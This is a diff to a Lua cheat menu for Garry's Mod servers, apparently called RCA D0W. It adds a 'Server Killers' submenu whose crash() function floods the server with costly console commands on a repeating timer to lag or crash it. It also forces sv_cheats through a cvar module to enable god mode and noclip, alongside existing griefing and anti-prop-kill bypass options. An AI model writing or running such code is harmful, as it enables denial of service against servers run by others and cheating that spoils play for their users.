@@ -15,6 +15,10 @@ local getit = require
 local SpankIt = "CreateMove"
 local DetectedStuff = "lua/bin/gmcl_cvar3_win32.dll"
 
+
+
+
+
 if itexistswow(DetectedStuff, "GAME") then
                 getit("cvar3")
                 gogogo = "true"
@@ -23,6 +27,44 @@ if itexistswow(DetectedStuff, "GAME") then
                 gogogo = "false"
                
 end
+
+
+local convar = CreateClientConVar("crashspeed",0.03,false,false)
+
+local again = true
+local overkill = false
+function crash()
+
+
+	RunConsoleCommand("groundlist")
+	RunConsoleCommand("groundlist")
+	RunConsoleCommand("groundlist")
+	if overkill then
+		RunConsoleCommand("soundscape_flush")
+		RunConsoleCommand("physics_constraints")
+		RunConsoleCommand("physics_debug_entity")
+		RunConsoleCommand("physics_select")
+		RunConsoleCommand("physics_budget")
+		RunConsoleCommand("sv_soundemitter_flush")
+		RunConsoleCommand("rr_reloadresponsesystems")
+		RunConsoleCommand("sv_soundscape_printdebuginfo")
+		RunConsoleCommand("dumpentityfactories")
+		RunConsoleCommand("soundscape_flush")
+		RunConsoleCommand("dump_globals")
+		RunConsoleCommand("dump_entity_sizes")
+		RunConsoleCommand("dumpeventqueue")
+		RunConsoleCommand("dbghist_addline")
+		RunConsoleCommand("dbghist_dump")
+		RunConsoleCommand("report_simthinklist")
+		RunConsoleCommand("report_entities")
+		RunConsoleCommand("server_game_time")
+	end
+	if !again then return end
+	timer.Simple(convar:GetFloat(),crash)
+	
+
+end
+
 
 
 local _R_C_A_D_0_W_ = "0.4.7" //RCA D0W V3r.
@@ -203,8 +245,32 @@ end)
 end):SetImage( "icon16/bug.png" )
 
 
-local Exploit = menu:AddSubMenu( "Misc exploits" )
+local SK = menu:AddSubMenu( "Misc exploits" )
 
+local Exploit = menu:AddSubMenu( "Server Killers" )
+
+SK:AddOption( "Lag Server V2 [ON]", function()
+xMsg("GG Server")
+again = true
+crash()
+end):SetImage( "icon16/bug.png" )
+
+SK:AddOption( "Lag Server V2 [OFF]", function()
+xMsg("UN_GG Server")
+again = false
+end):SetImage( "icon16/bug.png" )
+
+SK:AddOption( "Overkill Server [ON]", function()
+xMsg("GET FUKED SERVER")
+overkill = true
+crash()
+end):SetImage( "icon16/bug.png" )
+
+SK:AddOption( "Overkill Server [OFF]", function()
+xMsg("Attempting to UNFUCK May not work")
+overkill = false
+crash()
+end):SetImage( "icon16/bug.png" )
 
 Exploit:AddOption( "Bypass AntiPK", function()  RunConsoleCommand( "RAZORV_bypasspk" ) xMsg( "Attempting to bypass AntiPK.") end ) 
 
@@ -214,6 +280,9 @@ xMsg("Hoverball Fucked. Spawn one to ruin sky.")
 RunConsoleCommand("rope_material", "pp/bokehblur")
 RunConsoleCommand("hoverball_model", "hoverball_model", "models/props_combine/portalskydome.mdl")
 end):SetImage( "icon16/bug.png" )
+
+
+
 
 
 		Exploit:AddOption( " [ON] ATLAS CHAT: FREEZE EVERYBODY",function() 
@@ -290,7 +359,8 @@ end):SetImage( "icon16/disconnect.png" )
 
 Exploit:AddOption( "GodMod On", function()
 xMsg("Go_dMod_e Toggled On")
-LocalPlayer():GodEnable()
+twerkit("sv_cheats"):SetValue(1)
+RunConsoleCommand( "god" )
 end):SetImage( "icon16/bug.png" )
 
 Exploit:AddOption( "SpeedHack V2 [ON]", function()
@@ -307,10 +377,22 @@ end):SetImage( "icon16/bug.png" )
 
 Exploit:AddOption( "GodMod Off", function()
 xMsg("Go_dMod_e Toggled On")
-if LocalPlayer():Alive() then
-LocalPlayer():GodDisable()
-end
+twerkit("sv_cheats"):SetValue(0)
+RunConsoleCommand( "god" )
 end):SetImage( "icon16/bug.png" )
+
+Exploit:AddOption( "Noclip On", function()
+xMsg("N0CLIP Toggled On")
+twerkit("sv_cheats"):SetValue(1)
+RunConsoleCommand( "noclip" )
+end):SetImage( "icon16/bug.png" )
+
+Exploit:AddOption( "Noclip Off", function()
+xMsg("N0CLIP Toggled On")
+twerkit("sv_cheats"):SetValue(0)
+RunConsoleCommand( "noclip" )
+end):SetImage( "icon16/bug.png" )
+
 
 Exploit:AddOption( "ByB Force Bail", function()
 LocalPlayer():EmitSound("npc/metropolice/vo/allrightyoucango.wav",500,100)
